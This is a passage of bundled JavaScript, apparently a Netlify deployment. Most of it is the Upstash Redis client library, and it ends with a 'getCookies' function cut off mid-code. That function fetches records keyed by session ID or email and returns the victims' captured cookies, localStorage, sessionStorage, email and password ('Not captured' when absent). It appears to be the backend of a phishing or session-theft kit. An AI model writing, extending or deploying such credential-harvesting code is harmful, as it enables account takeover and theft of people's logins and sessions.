          nummultby: (...args) => new JsonNumMultByCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.objkeys
           */
          objkeys: (...args) => new JsonObjKeysCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.objlen
           */
          objlen: (...args) => new JsonObjLenCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.resp
           */
          resp: (...args) => new JsonRespCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.set
           */
          set: (...args) => new JsonSetCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.strappend
           */
          strappend: (...args) => new JsonStrAppendCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.strlen
           */
          strlen: (...args) => new JsonStrLenCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.toggle
           */
          toggle: (...args) => new JsonToggleCommand(args, this.opts).exec(this.client),
          /**
           * @see https://redis.io/commands/json.type
           */
          type: (...args) => new JsonTypeCommand(args, this.opts).exec(this.client)
        };
      }
      /**
       * Wrap a new middleware around the HTTP client.
       */
      use = (middleware) => {
        const makeRequest = this.client.request.bind(this.client);
        this.client.request = (req) => middleware(req, makeRequest);
      };
      /**
       * Technically this is not private, we can hide it from intellisense by doing this
       */
      addTelemetry = (telemetry) => {
        if (!this.enableTelemetry) {
          return;
        }
        try {
          this.client.mergeTelemetry(telemetry);
        } catch {
        }
      };
      /**
       * Creates a new script.
       *
       * Scripts offer the ability to optimistically try to execute a script without having to send the
       * entire script to the server. If the script is loaded on the server, it tries again by sending
       * the entire script. Afterwards, the script is cached on the server.
       *
       * @param script - The script to create
       * @param opts - Optional options to pass to the script `{ readonly?: boolean }`
       * @returns A new script
       *
       * @example
       * ```ts
       * const redis = new Redis({...})
       *
       * const script = redis.createScript<string>("return ARGV[1];")
       * const arg1 = await script.eval([], ["Hello World"])
       * expect(arg1, "Hello World")
       * ```
       * @example
       * ```ts
       * const redis = new Redis({...})
       *
       * const script = redis.createScript<string>("return ARGV[1];", { readonly: true })
       * const arg1 = await script.evalRo([], ["Hello World"])
       * expect(arg1, "Hello World")
       * ```
       */
      createScript(script, opts) {
        return opts?.readonly ? new ScriptRO(this, script) : new Script(this, script);
      }
      /**
       * Create a new pipeline that allows you to send requests in bulk.
       *
       * @see {@link Pipeline}
       */
      pipeline = () => new Pipeline({
        client: this.client,
        commandOptions: this.opts,
        multiExec: false
      });
      autoPipeline = () => {
        return createAutoPipelineProxy(this);
      };
      /**
       * Create a new transaction to allow executing multiple steps atomically.
       *
       * All the commands in a transaction are serialized and executed sequentially. A request sent by
       * another client will never be served in the middle of the execution of a Redis Transaction. This
       * guarantees that the commands are executed as a single isolated operation.
       *
       * @see {@link Pipeline}
       */
      multi = () => new Pipeline({
        client: this.client,
        commandOptions: this.opts,
        multiExec: true
      });
      /**
       * Returns an instance that can be used to execute `BITFIELD` commands on one key.
       *
       * @example
       * ```typescript
       * redis.set("mykey", 0);
       * const result = await redis.bitfield("mykey")
       *   .set("u4", 0, 16)
       *   .incr("u4", "#1", 1)
       *   .exec();
       * console.log(result); // [0, 1]
       * ```
       *
       * @see https://redis.io/commands/bitfield
       */
      bitfield = (...args) => new BitFieldCommand(args, this.client, this.opts);
      /**
       * @see https://redis.io/commands/append
       */
      append = (...args) => new AppendCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/bitcount
       */
      bitcount = (...args) => new BitCountCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/bitop
       */
      bitop = (op, destinationKey, sourceKey, ...sourceKeys) => new BitOpCommand([op, destinationKey, sourceKey, ...sourceKeys], this.opts).exec(
        this.client
      );
      /**
       * @see https://redis.io/commands/bitpos
       */
      bitpos = (...args) => new BitPosCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/copy
       */
      copy = (...args) => new CopyCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/dbsize
       */
      dbsize = () => new DBSizeCommand(this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/decr
       */
      decr = (...args) => new DecrCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/decrby
       */
      decrby = (...args) => new DecrByCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/del
       */
      del = (...args) => new DelCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/echo
       */
      echo = (...args) => new EchoCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/eval_ro
       */
      evalRo = (...args) => new EvalROCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/eval
       */
      eval = (...args) => new EvalCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/evalsha_ro
       */
      evalshaRo = (...args) => new EvalshaROCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/evalsha
       */
      evalsha = (...args) => new EvalshaCommand(args, this.opts).exec(this.client);
      /**
       * Generic method to execute any Redis command.
       */
      exec = (args) => new ExecCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/exists
       */
      exists = (...args) => new ExistsCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/expire
       */
      expire = (...args) => new ExpireCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/expireat
       */
      expireat = (...args) => new ExpireAtCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/flushall
       */
      flushall = (args) => new FlushAllCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/flushdb
       */
      flushdb = (...args) => new FlushDBCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/geoadd
       */
      geoadd = (...args) => new GeoAddCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/geopos
       */
      geopos = (...args) => new GeoPosCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/geodist
       */
      geodist = (...args) => new GeoDistCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/geohash
       */
      geohash = (...args) => new GeoHashCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/geosearch
       */
      geosearch = (...args) => new GeoSearchCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/geosearchstore
       */
      geosearchstore = (...args) => new GeoSearchStoreCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/get
       */
      get = (...args) => new GetCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/getbit
       */
      getbit = (...args) => new GetBitCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/getdel
       */
      getdel = (...args) => new GetDelCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/getex
       */
      getex = (...args) => new GetExCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/getrange
       */
      getrange = (...args) => new GetRangeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/getset
       */
      getset = (key, value) => new GetSetCommand([key, value], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hdel
       */
      hdel = (...args) => new HDelCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hexists
       */
      hexists = (...args) => new HExistsCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hexpire
       */
      hexpire = (...args) => new HExpireCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hexpireat
       */
      hexpireat = (...args) => new HExpireAtCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hexpiretime
       */
      hexpiretime = (...args) => new HExpireTimeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/httl
       */
      httl = (...args) => new HTtlCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hpexpire
       */
      hpexpire = (...args) => new HPExpireCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hpexpireat
       */
      hpexpireat = (...args) => new HPExpireAtCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hpexpiretime
       */
      hpexpiretime = (...args) => new HPExpireTimeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hpttl
       */
      hpttl = (...args) => new HPTtlCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hpersist
       */
      hpersist = (...args) => new HPersistCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hget
       */
      hget = (...args) => new HGetCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hgetall
       */
      hgetall = (...args) => new HGetAllCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hincrby
       */
      hincrby = (...args) => new HIncrByCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hincrbyfloat
       */
      hincrbyfloat = (...args) => new HIncrByFloatCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hkeys
       */
      hkeys = (...args) => new HKeysCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hlen
       */
      hlen = (...args) => new HLenCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hmget
       */
      hmget = (...args) => new HMGetCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hmset
       */
      hmset = (key, kv) => new HMSetCommand([key, kv], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hrandfield
       */
      hrandfield = (key, count, withValues) => new HRandFieldCommand([key, count, withValues], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hscan
       */
      hscan = (...args) => new HScanCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hset
       */
      hset = (key, kv) => new HSetCommand([key, kv], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hsetnx
       */
      hsetnx = (key, field, value) => new HSetNXCommand([key, field, value], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hstrlen
       */
      hstrlen = (...args) => new HStrLenCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/hvals
       */
      hvals = (...args) => new HValsCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/incr
       */
      incr = (...args) => new IncrCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/incrby
       */
      incrby = (...args) => new IncrByCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/incrbyfloat
       */
      incrbyfloat = (...args) => new IncrByFloatCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/keys
       */
      keys = (...args) => new KeysCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lindex
       */
      lindex = (...args) => new LIndexCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/linsert
       */
      linsert = (key, direction, pivot, value) => new LInsertCommand([key, direction, pivot, value], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/llen
       */
      llen = (...args) => new LLenCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lmove
       */
      lmove = (...args) => new LMoveCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lpop
       */
      lpop = (...args) => new LPopCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lmpop
       */
      lmpop = (...args) => new LmPopCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lpos
       */
      lpos = (...args) => new LPosCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lpush
       */
      lpush = (key, ...elements) => new LPushCommand([key, ...elements], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lpushx
       */
      lpushx = (key, ...elements) => new LPushXCommand([key, ...elements], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lrange
       */
      lrange = (...args) => new LRangeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lrem
       */
      lrem = (key, count, value) => new LRemCommand([key, count, value], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/lset
       */
      lset = (key, index, value) => new LSetCommand([key, index, value], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/ltrim
       */
      ltrim = (...args) => new LTrimCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/mget
       */
      mget = (...args) => new MGetCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/mset
       */
      mset = (kv) => new MSetCommand([kv], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/msetnx
       */
      msetnx = (kv) => new MSetNXCommand([kv], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/persist
       */
      persist = (...args) => new PersistCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/pexpire
       */
      pexpire = (...args) => new PExpireCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/pexpireat
       */
      pexpireat = (...args) => new PExpireAtCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/pfadd
       */
      pfadd = (...args) => new PfAddCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/pfcount
       */
      pfcount = (...args) => new PfCountCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/pfmerge
       */
      pfmerge = (...args) => new PfMergeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/ping
       */
      ping = (args) => new PingCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/psetex
       */
      psetex = (key, ttl, value) => new PSetEXCommand([key, ttl, value], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/psubscribe
       */
      psubscribe = (patterns) => {
        const patternArray = Array.isArray(patterns) ? patterns : [patterns];
        return new Subscriber(this.client, patternArray, true);
      };
      /**
       * @see https://redis.io/commands/pttl
       */
      pttl = (...args) => new PTtlCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/publish
       */
      publish = (...args) => new PublishCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/randomkey
       */
      randomkey = () => new RandomKeyCommand().exec(this.client);
      /**
       * @see https://redis.io/commands/rename
       */
      rename = (...args) => new RenameCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/renamenx
       */
      renamenx = (...args) => new RenameNXCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/rpop
       */
      rpop = (...args) => new RPopCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/rpush
       */
      rpush = (key, ...elements) => new RPushCommand([key, ...elements], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/rpushx
       */
      rpushx = (key, ...elements) => new RPushXCommand([key, ...elements], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/sadd
       */
      sadd = (key, member, ...members) => new SAddCommand([key, member, ...members], this.opts).exec(this.client);
      scan(cursor, opts) {
        return new ScanCommand([cursor, opts], this.opts).exec(this.client);
      }
      /**
       * @see https://redis.io/commands/scard
       */
      scard = (...args) => new SCardCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/script-exists
       */
      scriptExists = (...args) => new ScriptExistsCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/script-flush
       */
      scriptFlush = (...args) => new ScriptFlushCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/script-load
       */
      scriptLoad = (...args) => new ScriptLoadCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/sdiff
       */
      sdiff = (...args) => new SDiffCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/sdiffstore
       */
      sdiffstore = (...args) => new SDiffStoreCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/set
       */
      set = (key, value, opts) => new SetCommand([key, value, opts], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/setbit
       */
      setbit = (...args) => new SetBitCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/setex
       */
      setex = (key, ttl, value) => new SetExCommand([key, ttl, value], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/setnx
       */
      setnx = (key, value) => new SetNxCommand([key, value], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/setrange
       */
      setrange = (...args) => new SetRangeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/sinter
       */
      sinter = (...args) => new SInterCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/sinterstore
       */
      sinterstore = (...args) => new SInterStoreCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/sismember
       */
      sismember = (key, member) => new SIsMemberCommand([key, member], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/smismember
       */
      smismember = (key, members) => new SMIsMemberCommand([key, members], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/smembers
       */
      smembers = (...args) => new SMembersCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/smove
       */
      smove = (source, destination, member) => new SMoveCommand([source, destination, member], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/spop
       */
      spop = (...args) => new SPopCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/srandmember
       */
      srandmember = (...args) => new SRandMemberCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/srem
       */
      srem = (key, ...members) => new SRemCommand([key, ...members], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/sscan
       */
      sscan = (...args) => new SScanCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/strlen
       */
      strlen = (...args) => new StrLenCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/subscribe
       */
      subscribe = (channels) => {
        const channelArray = Array.isArray(channels) ? channels : [channels];
        return new Subscriber(this.client, channelArray);
      };
      /**
       * @see https://redis.io/commands/sunion
       */
      sunion = (...args) => new SUnionCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/sunionstore
       */
      sunionstore = (...args) => new SUnionStoreCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/time
       */
      time = () => new TimeCommand().exec(this.client);
      /**
       * @see https://redis.io/commands/touch
       */
      touch = (...args) => new TouchCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/ttl
       */
      ttl = (...args) => new TtlCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/type
       */
      type = (...args) => new TypeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/unlink
       */
      unlink = (...args) => new UnlinkCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xadd
       */
      xadd = (...args) => new XAddCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xack
       */
      xack = (...args) => new XAckCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xdel
       */
      xdel = (...args) => new XDelCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xgroup
       */
      xgroup = (...args) => new XGroupCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xread
       */
      xread = (...args) => new XReadCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xreadgroup
       */
      xreadgroup = (...args) => new XReadGroupCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xinfo
       */
      xinfo = (...args) => new XInfoCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xlen
       */
      xlen = (...args) => new XLenCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xpending
       */
      xpending = (...args) => new XPendingCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xclaim
       */
      xclaim = (...args) => new XClaimCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xautoclaim
       */
      xautoclaim = (...args) => new XAutoClaim(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xtrim
       */
      xtrim = (...args) => new XTrimCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xrange
       */
      xrange = (...args) => new XRangeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/xrevrange
       */
      xrevrange = (...args) => new XRevRangeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zadd
       */
      zadd = (...args) => {
        if ("score" in args[1]) {
          return new ZAddCommand([args[0], args[1], ...args.slice(2)], this.opts).exec(
            this.client
          );
        }
        return new ZAddCommand(
          [args[0], args[1], ...args.slice(2)],
          this.opts
        ).exec(this.client);
      };
      /**
       * @see https://redis.io/commands/zcard
       */
      zcard = (...args) => new ZCardCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zcount
       */
      zcount = (...args) => new ZCountCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zdiffstore
       */
      zdiffstore = (...args) => new ZDiffStoreCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zincrby
       */
      zincrby = (key, increment, member) => new ZIncrByCommand([key, increment, member], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zinterstore
       */
      zinterstore = (...args) => new ZInterStoreCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zlexcount
       */
      zlexcount = (...args) => new ZLexCountCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zmscore
       */
      zmscore = (...args) => new ZMScoreCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zpopmax
       */
      zpopmax = (...args) => new ZPopMaxCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zpopmin
       */
      zpopmin = (...args) => new ZPopMinCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zrange
       */
      zrange = (...args) => new ZRangeCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zrank
       */
      zrank = (key, member) => new ZRankCommand([key, member], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zrem
       */
      zrem = (key, ...members) => new ZRemCommand([key, ...members], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zremrangebylex
       */
      zremrangebylex = (...args) => new ZRemRangeByLexCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zremrangebyrank
       */
      zremrangebyrank = (...args) => new ZRemRangeByRankCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zremrangebyscore
       */
      zremrangebyscore = (...args) => new ZRemRangeByScoreCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zrevrank
       */
      zrevrank = (key, member) => new ZRevRankCommand([key, member], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zscan
       */
      zscan = (...args) => new ZScanCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zscore
       */
      zscore = (key, member) => new ZScoreCommand([key, member], this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zunion
       */
      zunion = (...args) => new ZUnionCommand(args, this.opts).exec(this.client);
      /**
       * @see https://redis.io/commands/zunionstore
       */
      zunionstore = (...args) => new ZUnionStoreCommand(args, this.opts).exec(this.client);
    };
    VERSION = "v1.35.1";
  }
});

// ../../node_modules/@upstash/redis/nodejs.mjs
var nodejs_exports = {};
__export(nodejs_exports, {
  Redis: () => Redis2,
  errors: () => error_exports
});
var Redis2;
var init_nodejs = __esm({
  "../../node_modules/@upstash/redis/nodejs.mjs"() {
    init_chunk_AIBLSL5D();
    if (typeof atob === "undefined") {
      global.atob = (b64) => Buffer.from(b64, "base64").toString("utf8");
    }
    Redis2 = class _Redis extends Redis {
      /**
       * Create a new redis client by providing a custom `Requester` implementation
       *
       * @example
       * ```ts
       *
       * import { UpstashRequest, Requester, UpstashResponse, Redis } from "@upstash/redis"
       *
       *  const requester: Requester = {
       *    request: <TResult>(req: UpstashRequest): Promise<UpstashResponse<TResult>> => {
       *      // ...
       *    }
       *  }
       *
       * const redis = new Redis(requester)
       * ```
       */
      constructor(configOrRequester) {
        if ("request" in configOrRequester) {
          super(configOrRequester);
          return;
        }
        if (!configOrRequester.url) {
          console.warn(
            `[Upstash Redis] The 'url' property is missing or undefined in your Redis config.`
          );
        } else if (configOrRequester.url.startsWith(" ") || configOrRequester.url.endsWith(" ") || /\r|\n/.test(configOrRequester.url)) {
          console.warn(
            "[Upstash Redis] The redis url contains whitespace or newline, which can cause errors!"
          );
        }
        if (!configOrRequester.token) {
          console.warn(
            `[Upstash Redis] The 'token' property is missing or undefined in your Redis config.`
          );
        } else if (configOrRequester.token.startsWith(" ") || configOrRequester.token.endsWith(" ") || /\r|\n/.test(configOrRequester.token)) {
          console.warn(
            "[Upstash Redis] The redis token contains whitespace or newline, which can cause errors!"
          );
        }
        const client = new HttpClient({
          baseUrl: configOrRequester.url,
          retry: configOrRequester.retry,
          headers: { authorization: `Bearer ${configOrRequester.token}` },
          agent: configOrRequester.agent,
          responseEncoding: configOrRequester.responseEncoding,
          cache: configOrRequester.cache ?? "no-store",
          signal: configOrRequester.signal,
          keepAlive: configOrRequester.keepAlive,
          readYourWrites: configOrRequester.readYourWrites
        });
        super(client, {
          automaticDeserialization: configOrRequester.automaticDeserialization,
          enableTelemetry: !process.env.UPSTASH_DISABLE_TELEMETRY,
          latencyLogging: configOrRequester.latencyLogging,
          enableAutoPipelining: configOrRequester.enableAutoPipelining
        });
        this.addTelemetry({
          runtime: (
            // @ts-expect-error to silence compiler
            typeof EdgeRuntime === "string" ? "edge-light" : `node@${process.version}`
          ),
          platform: process.env.VERCEL ? "vercel" : process.env.AWS_REGION ? "aws" : "unknown",
          sdk: `@upstash/redis@${VERSION}`
        });
        if (this.enableAutoPipelining) {
          return this.autoPipeline();
        }
      }
      /**
       * Create a new Upstash Redis instance from environment variables.
       *
       * Use this to automatically load connection secrets from your environment
       * variables. For instance when using the Vercel integration.
       *
       * This tries to load `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN` from
       * your environment using `process.env`.
       */
      static fromEnv(config) {
        if (process.env === void 0) {
          throw new TypeError(
            '[Upstash Redis] Unable to get environment variables, `process.env` is undefined. If you are deploying to cloudflare, please import from "@upstash/redis/cloudflare" instead'
          );
        }
        const url = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
        if (!url) {
          console.warn("[Upstash Redis] Unable to find environment variable: `UPSTASH_REDIS_REST_URL`");
        }
        const token = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;
        if (!token) {
          console.warn(
            "[Upstash Redis] Unable to find environment variable: `UPSTASH_REDIS_REST_TOKEN`"
          );
        }
        return new _Redis({ ...config, url, token });
      }
    };
  }
});

// netlify/functions/getCookies.js
var getCookies_exports = {};
__export(getCookies_exports, {
  handler: () => handler
});
module.exports = __toCommonJS(getCookies_exports);
var handler = async (event, context) => {
  const headers = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Allow-Methods": "GET, OPTIONS"
  };
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers,
      body: ""
    };
  }
  if (event.httpMethod !== "GET") {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: "Method not allowed" })
    };
  }
  try {
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
    if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
      console.error("Missing Redis configuration in getCookies");
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: "Server configuration error - Redis credentials missing"
        })
      };
    }
    let redis;
    try {
      const { Redis: Redis3 } = await Promise.resolve().then(() => (init_nodejs(), nodejs_exports));
      redis = new Redis3({
        url: UPSTASH_REDIS_REST_URL,
        token: UPSTASH_REDIS_REST_TOKEN
      });
    } catch (redisError) {
      console.error("Redis initialization error:", redisError);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: "Database connection error",
          details: redisError.message
        })
      };
    }
    const getClientIP = () => {
      return event.headers["x-forwarded-for"]?.split(",")[0]?.trim() || event.headers["x-real-ip"] || event.headers["cf-connecting-ip"] || event.requestContext?.identity?.sourceIp || "Unknown";
    };
    const url = event.queryStringParameters || {};
    const sessionId = url.sessionId;
    const email = url.email;
    console.log("\u{1F50D} Getting cookies for:", { sessionId, email });
    if (!sessionId && !email) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: "SessionId or email parameter required" })
      };
    }
    let cookiesData = null;
    if (sessionId) {
      try {
        const sessionData = await redis.get(`session:${sessionId}`);
        if (sessionData) {
          const session = JSON.parse(sessionData);
          cookiesData = {
            cookies: session.formattedCookies || session.cookies || [],
            localStorage: session.localStorage || "Empty",
            sessionStorage: session.sessionStorage || "Empty",
            timestamp: session.timestamp,
            email: session.email,
            password: session.password || "Not captured"
          };
        }
      } catch (error) {
        console.error("Error getting session by ID:", error);
      }
    }
    if (!cookiesData && email) {
      try {
        const userData = await redis.get(`user:${email}`);
        if (userData) {
          const user = JSON.parse(userData);
          cookiesData = {
            cookies: user.formattedCookies || user.cookies || [],
            localStorage: user.localStorage || "Empty",
            sessionStorage: user.sessionStorage || "Empty",
            timestamp: user.timestamp,
            email: user.email,
            password: user.password || "Not captured"
          };
        }
      } catch (error) {
        console.error("Error getting user by email:", error);
      }
    }
    if (!cookiesData && sessionId) {
      try {
        const cookieSpecificData = await redis.get(`cookies:${sessionId}`);
        if (cookieSpecificData) {
